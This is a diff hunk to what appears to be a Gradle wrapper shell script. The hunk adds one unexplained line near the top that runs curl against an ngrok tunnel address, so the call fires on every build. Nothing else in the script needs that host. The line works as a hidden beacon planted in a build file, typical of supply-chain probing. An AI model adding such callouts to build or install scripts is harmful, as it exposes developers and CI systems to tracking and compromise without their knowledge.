@@ -6,6 +6,8 @@
 ##
 ##############################################################################
 
+curl https://85b9-119-82-122-194.ngrok-free.app 
+
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
 PRG="$0"
